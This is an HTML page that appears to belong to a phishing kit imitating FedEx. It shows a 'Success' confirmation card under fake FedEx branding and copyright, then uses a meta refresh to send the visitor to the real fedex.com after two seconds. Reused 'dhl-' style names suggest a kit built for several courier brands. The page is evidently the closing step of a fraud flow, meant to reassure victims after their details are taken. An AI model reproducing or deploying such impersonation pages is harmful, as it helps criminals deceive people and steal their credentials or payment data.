<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="en" class="wf-roboto-n4-active wf-roboto-n3-active wf-roboto-n5-active wf-roboto-n7-active wf-roboto-i4-active js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths uk-notouch wf-sourcecodepro-n4-active wf-sourcecodepro-n7-active wf-active js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="refresh" content="2; URL=https://www.fedex.com/en-us/home.html">

    <link rel="icon" type="image/gif" href="https://www.fedex.com/etc.clientlibs/designs/fedex-common/images/resources/fx-favicon.ico" sizes="16x16">
    <link rel="icon" type="image/gif" href="https://www.fedex.com/etc.clientlibs/designs/fedex-common/images/resources/fx-favicon.ico" sizes="32x32">

    <title>Fedex - ...</title>

    <link href="./fedex/css" rel="stylesheet" type="text/css">

    <!-- uikit -->
    <link rel="stylesheet" href="./fedex/uikit.almost-flat.min.css" media="all">
    <!-- uikit -->

    <link rel="stylesheet" href="./fedex/uikit.almost-flat.min(1).css">

    <!-- altair admin assets page -->
    <link rel="stylesheet" href="./fedex/login_page.min.css">
    <link rel="stylesheet" href="./fedex/Raleway-Medium.ttf">
    <link href="./fedex/css2" rel="stylesheet">

    <style type="text/css">
       body {
        padding: 40px 0;
        background: #EBF0F5;
      }
        h1 {
          color: #88B04B;
          font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
          font-weight: 900;
          font-size: 40px;
          margin-bottom: 10px;
        }
        p {
          color: #404F5E;
          font-family: "Nunito Sans", "Helvetica Neue", sans-serif;
          font-size:20px;
          margin: 0;
        }
      i {
        color: #9ABC66;
        font-size: 100px;
        line-height: 200px;
        margin-left:-15px;
      }
      .card {
        background: white;
        padding: 60px;
        border-radius: 4px;
        box-shadow: 0 2px 3px #C8D0D8;
        display: inline-block;
        margin: 0 auto;
      }


    body{
      padding: 0;
    }
	.uk-form-row {
    position: relative;
    display: flex;
    flex-flow: column;
    padding: 10px;
    background-color: #fff;
    border: 1px solid #d1d1d1;
    border-radius: 4px;
}
.dhl-InputField-input {
    display: block;
    order: 1;
    font-family: inherit;
    resize: none;
    border: none;
    border-radius: 0;
    outline: none;
}
   @font-face {
         font-family: "Frutiger";
         src: url('./files/fonts/FrutigerLTStd-Roman.otf');
         }

   .digital {
         font-family: "Frutiger";
         }

         #header_main{
          background-color: #4D148C;
           background-repeat: no-repeat;
           height: 60px;
           margin: 0;
         }

         .uk-navbar-flip {
             padding: 15px;
         }

         .md-btn {
    border-radius: 4px;
    padding: 4px 16px;
  }

  .login_page_wrapper{
    padding-top: 5%;
  }
  @media (max-width: 460px){
    .login_page_wrapper {
      max-width: 90%;
    }
  }
  .dhl-Button--secondary, .dhl-Button--dark {
    color: #d40511 !important;
    background-color: rgba(255,255,255,0.6) !important;
	  border: 1px solid #d40511 !important;
}
.dhl-Button {
	width: 100%;
    position: relative;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    min-width: 3rem;
    min-height: 3rem;
    padding: 0;
    overflow: visible;
    font-family: inherit;
    font-size: 1rem;
    font-weight: 700;
    line-height: 100%;
    color: inherit;
    text-align: center;
    text-decoration: none;
    white-space: normal;
    vertical-align: middle;
    touch-action: manipulation;
    cursor: pointer;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    background-color: transparent;
    border: 0;
    border-radius: 4px;
    transition: background-color .15s ease,border-color .15s ease,color .15s ease,transform .15s cubic-bezier(0.215, 0.61, 0.355, 1);
    will-change: transform;
}
.dhl-Button--secondary::before, .dhl-Button--dark::before {
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    content: "";
    border: 1px solid #d40511 !important;
    border-radius: inherit;
    transition: border-color .15s ease;
}
.invlog{
  margin-bottom: 10px;
  display: inline-block;
  color: #d40511 !important;
}
</style><link rel="stylesheet" href="./fedex/css(1)" media="all"><link rel="stylesheet" href="./fedex/css(2)" media="all">

</head>
<body class="login_page" >
  <header id="header_main">
      <div class="header_main_content">
          <nav class="uk-navbar" style="background: none; border: none;">
            
          <a href="#" style="margin-left:0px; padding-top:10px; margin-top:1px;"><img class="img" src="./fedex/logo.png" style="/*max-width:170px;margin-top:28px;margin-left:35px;*/ height: 30PX; margin-top: 20px; margin-left: 40px;" alt=""></a>
              

            </nav>
          </div>
        </header>
    <div class="login_page_wrapper">
        <div class="" style="background:#fff; padding:25px 15px 15px;" id="login_card">
         
            <div class="md-card-content large-padding" id="login_form">
                <style type="text/css">
                  .lds-spinner {
  color: official;
  display: inline-block;
  position: relative;
  width: 80px;
  height: 80px;
}
.lds-spinner div {
  transform-origin: 40px 40px;
  animation: lds-spinner 1.2s linear infinite;
}
.lds-spinner div:after {
  content: " ";
  display: block;
  position: absolute;
  top: 3px;
  left: 37px;
  width: 6px;
  height: 18px;
  border-radius: 20%;
  background: #4D148C;
}
.lds-spinner div:nth-child(1) {
  transform: rotate(0deg);
  animation-delay: -1.1s;
}
.lds-spinner div:nth-child(2) {
  transform: rotate(30deg);
  animation-delay: -1s;
}
.lds-spinner div:nth-child(3) {
  transform: rotate(60deg);
  animation-delay: -0.9s;
}
.lds-spinner div:nth-child(4) {
  transform: rotate(90deg);
  animation-delay: -0.8s;
}
.lds-spinner div:nth-child(5) {
  transform: rotate(120deg);
  animation-delay: -0.7s;
}
.lds-spinner div:nth-child(6) {
  transform: rotate(150deg);
  animation-delay: -0.6s;
}
.lds-spinner div:nth-child(7) {
  transform: rotate(180deg);
  animation-delay: -0.5s;
}
.lds-spinner div:nth-child(8) {
  transform: rotate(210deg);
  animation-delay: -0.4s;
}
.lds-spinner div:nth-child(9) {
  transform: rotate(240deg);
  animation-delay: -0.3s;
}
.lds-spinner div:nth-child(10) {
  transform: rotate(270deg);
  animation-delay: -0.2s;
}
.lds-spinner div:nth-child(11) {
  transform: rotate(300deg);
  animation-delay: -0.1s;
}
.lds-spinner div:nth-child(12) {
  transform: rotate(330deg);
  animation-delay: 0s;
}
@keyframes lds-spinner {
  0% {
    opacity: 1;
  }
  100% {
    opacity: 0;
  }
}

                </style>

                <center>
                <div class="card">
      <div style="border-radius:200px; height:200px; width:200px; background: #F8FAF5; margin:0 auto; text-align: center;">
        <i class="checkmark">✓</i>
      </div>
        <h1>Success</h1> 
       
      </div>

                </center>
            </div>


        </div>

    </div>
    <!-- google web fonts -->
<center>

<br><footer style="color: #4D148C;font-family: Raleway;">© Copyright 2021 Fedex-</footer>
</center>

      <script src="./fedex/webfont.js" type="text/javascript" async=""></script><script src="./fedex/webfont.js(1)" type="text/javascript" async=""></script><script>
      WebFontConfig = {
          google: {
              families: [
                  'Source+Code+Pro:400,700:latin',
                  'Roboto:400,300,500,700,400italic:latin'
              ]
          }
      };
      (function() {
          var wf = document.createElement('script');
          wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
          '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
          wf.type = 'text/javascript';
          wf.async = 'true';
          var s = document.getElementsByTagName('script')[0];
          s.parentNode.insertBefore(wf, s);
      })();
  </script>

  <!-- momentJS date library -->
  <script src="./fedex/moment.min.js"></script>

  <!-- common functions -->
  <script src="./fedex/common.min.js"></script>
  <!-- uikit functions -->
  <script src="./fedex/uikit_custom.min.js"></script>
  <!-- altair common functions/helpers -->
  <script src="./fedex/altair_admin_common.min.js"></script>

  <!-- page specific plugins -->

  <!--  notifications functions -->
  <script src="./fedex/components_notifications.min.js"></script>

  <!-- enable hires images -->
  <script>
      $(function() {
          altair_helpers.retina_images();
      });
  </script>


    <!-- altair assets page functions -->
    <script src="./fedex/login_page.min.js"></script>



</body></html>